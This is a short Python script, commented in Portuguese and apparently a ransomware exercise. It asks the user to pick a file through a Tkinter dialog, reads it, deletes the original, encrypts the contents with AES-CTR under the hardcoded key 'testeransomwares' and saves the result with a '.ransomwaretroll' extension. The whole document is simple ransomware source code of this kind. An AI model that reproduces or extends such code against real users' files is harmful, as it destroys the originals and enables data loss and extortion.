import os
import pyaes
import tkinter as tk
from tkinter import filedialog

# Criar uma janela oculta do Tkinter
root = tk.Tk()
root.withdraw()

# Abrir um diálogo para selecionar um arquivo
file_path = filedialog.askopenfilename(title="Selecione um arquivo para criptografar")

# Verifica se o usuário selecionou um arquivo
if file_path:
    # Ler o arquivo
    with open(file_path, "rb") as file:
        file_data = file.read()
    
    # Remover o arquivo original
    os.remove(file_path)
    
    # Definir a chave de criptografia
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    
    # Criptografar o arquivo
    crypto_data = aes.encrypt(file_data)
    
    # Criar um novo nome para o arquivo criptografado
    new_file_path = file_path + ".ransomwaretroll"
    
    # Salvar o arquivo criptografado
    with open(new_file_path, "wb") as new_file:
        new_file.write(crypto_data)
    
    print(f"Arquivo criptografado salvo como: {new_file_path}")
else:
    print("Nenhum arquivo foi selecionado.")
